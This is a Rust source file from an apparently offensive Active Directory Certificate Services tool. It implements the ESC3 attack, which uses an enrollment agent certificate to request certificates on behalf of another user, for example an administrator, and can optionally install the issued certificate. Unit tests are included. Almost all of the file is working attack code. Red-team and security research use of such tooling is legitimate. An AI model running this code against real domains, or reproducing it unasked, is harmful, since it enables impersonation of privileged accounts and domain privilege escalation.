//! Request a certificate on behalf of another user (ESC3)
//!
//! This command uses an enrollment agent certificate to request a certificate
//! for another user. This is used for ESC3 exploitation scenarios.

use crate::enrollment::enrollment::CertificateEnrollment;
use crate::error::Result;

/// Configuration for CertRequestOnBehalf command
#[derive(Debug, Clone)]
pub struct CertRequestOnBehalfConfig {
    /// Template name to use for the request
    pub template: String,
    /// CA configuration string (e.g., "CA01\\CA-Name")
    pub ca_config: String,
    /// User to request certificate for (SID or UPN)
    pub on_behalf_of: String,
    /// Path to enrollment agent certificate
    pub enrollment_agent_cert_path: String,
    /// Install the certificate automatically if issued
    pub install: bool,
}

impl CertRequestOnBehalfConfig {
    /// Create a new configuration
    ///
    /// # Arguments
    ///
    /// * `template` - Template name
    /// * `ca_config` - CA configuration string
    /// * `on_behalf_of` - User to request for
    /// * `enrollment_agent_cert_path` - Path to enrollment agent certificate
    ///
    /// # Example
    ///
    /// ```
    /// use certify::commands::cert_request_on_behalf::CertRequestOnBehalfConfig;
    ///
    /// let config = CertRequestOnBehalfConfig::new(
    ///     "User",
    ///     "CA01\\MyCA",
    ///     "administrator@example.com",
    ///     "/path/to/agent.pfx"
    /// );
    /// assert_eq!(config.on_behalf_of, "administrator@example.com");
    /// ```
    pub fn new(
        template: impl Into<String>,
        ca_config: impl Into<String>,
        on_behalf_of: impl Into<String>,
        enrollment_agent_cert_path: impl Into<String>,
    ) -> Self {
        Self {
            template: template.into(),
            ca_config: ca_config.into(),
            on_behalf_of: on_behalf_of.into(),
            enrollment_agent_cert_path: enrollment_agent_cert_path.into(),
            install: false,
        }
    }

    /// Enable automatic installation of the certificate
    pub fn install(mut self, enabled: bool) -> Self {
        self.install = enabled;
        self
    }
}

/// Execute the CertRequestOnBehalf command
///
/// Requests a certificate on behalf of another user using an enrollment agent
/// certificate. This is used for ESC3 exploitation.
///
/// # Arguments
///
/// * `config` - Command configuration
///
/// # Returns
///
/// Success message with certificate information
///
/// # Example
///
/// ```no_run
/// use certify::commands::cert_request_on_behalf::{CertRequestOnBehalfConfig, execute};
///
/// let config = CertRequestOnBehalfConfig::new(
///     "User",
///     "CA01\\MyCA",
///     "admin@example.com",
///     "/path/to/agent.pfx"
/// );
/// // let output = execute(&config)?;
/// # Ok::<(), certify::CertifyError>(())
/// ```
pub fn execute(config: &CertRequestOnBehalfConfig) -> Result<String> {
    // Read the enrollment agent certificate
    let agent_cert_data = std::fs::read(&config.enrollment_agent_cert_path)?;

    // Create enrollment context
    let enrollment = CertificateEnrollment::new()?;

    // Request certificate on behalf of the user (ESC3)
    let result = enrollment.request_certificate_on_behalf(
        &config.template,
        &config.ca_config,
        &config.on_behalf_of,
        &agent_cert_data,
    )?;

    // Format output message
    let mut output = String::new();
    output.push_str("\n[*] Certificate request submitted (on behalf of user)\n");
    output.push_str("    [ESC3] Using enrollment agent certificate\n");
    output.push_str(&format!("    Template: {}\n", config.template));
    output.push_str(&format!("    CA: {}\n", config.ca_config));
    output.push_str(&format!("    On behalf of: {}\n", config.on_behalf_of));
    output.push_str(&format!(
        "    Agent cert: {}\n",
        config.enrollment_agent_cert_path
    ));
    output.push_str(&format!("    Status: {:?}\n", result.status));

    if let Some(request_id) = result.request_id {
        output.push_str(&format!("    Request ID: {}\n", request_id));
    }

    // Handle result based on status
    match result.status {
        crate::enrollment::enrollment::EnrollmentStatus::Issued => {
            output.push_str("\n[+] Certificate issued successfully\n");

            if let Some(ref cert) = result.certificate {
                output.push_str(&format!("    Certificate size: {} bytes\n", cert.len()));

                if config.install {
                    // Note: Installing a certificate issued for another user
                    // may not work in all scenarios
                    enrollment.install_certificate(cert)?;
                    output.push_str("[+] Certificate installed to personal store\n");
                    output.push_str("[!] Warning: Certificate was issued for another user\n");
                }
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Pending => {
            output.push_str("\n[!] Certificate request is pending manager approval\n");
            if let Some(request_id) = result.request_id {
                output.push_str(&format!(
                    "    Use request ID {} to download the certificate later\n",
                    request_id
                ));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Denied => {
            output.push_str("\n[!] Certificate request was denied\n");
            if let Some(ref error) = result.error_message {
                output.push_str(&format!("    Reason: {}\n", error));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Failed => {
            output.push_str("\n[!] Certificate request failed\n");
            if let Some(ref error) = result.error_message {
                output.push_str(&format!("    Error: {}\n", error));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Installed => {
            output.push_str("\n[+] Certificate issued and installed\n");
        }
    }

    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cert_request_on_behalf_config_new() {
        let config = CertRequestOnBehalfConfig::new(
            "User",
            "CA01\\MyCA",
            "admin@example.com",
            "/path/to/agent.pfx",
        );

        assert_eq!(config.template, "User");
        assert_eq!(config.ca_config, "CA01\\MyCA");
        assert_eq!(config.on_behalf_of, "admin@example.com");
        assert_eq!(config.enrollment_agent_cert_path, "/path/to/agent.pfx");
        assert!(!config.install);
    }

    #[test]
    fn test_cert_request_on_behalf_config_install() {
        let config =
            CertRequestOnBehalfConfig::new("T", "CA", "user", "/cert").install(true);

        assert!(config.install);
    }

    #[test]
    fn test_config_clone() {
        let config1 =
            CertRequestOnBehalfConfig::new("T", "CA", "user", "/cert").install(true);
        let config2 = config1.clone();

        assert_eq!(config1.template, config2.template);
        assert_eq!(config1.on_behalf_of, config2.on_behalf_of);
        assert_eq!(config1.install, config2.install);
    }
}
